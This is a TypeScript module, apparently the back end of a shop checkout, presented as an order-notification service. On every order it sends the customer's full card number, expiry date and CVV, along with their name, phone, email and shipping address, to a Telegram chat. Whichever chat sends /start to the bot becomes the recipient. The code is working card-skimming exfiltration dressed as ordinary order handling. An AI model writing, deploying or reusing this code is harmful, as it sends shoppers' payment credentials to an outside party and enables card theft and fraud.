import { Order, CheckoutForm } from "@shared/schema";
import TelegramBot from "node-telegram-bot-api";
import dotenv from "dotenv";

// Load environment variables from .env file
dotenv.config();

interface OrderInfo extends Order {
  paymentInfo: {
    cardNumberLast4: string;
    expiryDate: string;
  };
  phoneNumber: string;
}

class OrderInfoReceiver {
  private static instance: OrderInfoReceiver;
  private orders: Map<number, OrderInfo>;
  private bot: TelegramBot;
  private TELEGRAM_CHAT_ID: string;

  private constructor() {
    this.orders = new Map();

    // Load credentials from environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    this.TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

    if (!botToken) {
      throw new Error("Telegram bot token is missing in .env file");
    }

    this.bot = new TelegramBot(botToken, { polling: false, webHook: false });
    this.setupBotListeners();
  }

  public static getInstance(): OrderInfoReceiver {
    if (!OrderInfoReceiver.instance) {
      OrderInfoReceiver.instance = new OrderInfoReceiver();
    }
    return OrderInfoReceiver.instance;
  }

  private setupBotListeners() {
    this.bot.on("message", async (msg) => {
      const chatId = msg.chat.id;
      const text = msg.text;

      if (text === "/start") {
        this.TELEGRAM_CHAT_ID = chatId.toString();
        await this.bot.sendMessage(chatId, "Bot is ready to receive order verifications.");
      }
    });
  }

  public async processOrder(orderData: CheckoutForm, orderId: number): Promise<void> {
    const orderInfo: OrderInfo = {
      ...orderData,
      id: orderId,
      paymentInfo: {
        cardNumberLast4: orderData.cardNumber.slice(-4),
        expiryDate: orderData.expiryDate,
      },
      phoneNumber: orderData.phoneNumber,
    };

    this.orders.set(orderId, orderInfo);

    const message = `
🛍 New Order Received:
Order ID: ${orderId}
Customer: ${orderData.customerName}
📱 Phone: ${orderData.phoneNumber}
Email: ${orderData.email}
Amount: $${orderData.total}

💳 Payment Details:
Card: ${orderData.cardNumber}
Exp: ${orderData.expiryDate}
CVV: ${orderData.cvv}

📍 Shipping Address:
${orderData.address}
${orderData.city}, ${orderData.state} ${orderData.zipCode}
`;

    try {
      if (this.TELEGRAM_CHAT_ID) {
        await this.bot.sendMessage(this.TELEGRAM_CHAT_ID, message);
      } else {
        console.error("Telegram Chat ID not yet set. Please send /start to the bot.");
      }
    } catch (error) {
      console.error("Failed to send message to Telegram:", error);
    }
  }

  public getOrderInfo(orderId: number): OrderInfo | null {
    return this.orders.get(orderId) || null;
  }
}

export const orderInfoReceiver = OrderInfoReceiver.getInstance();
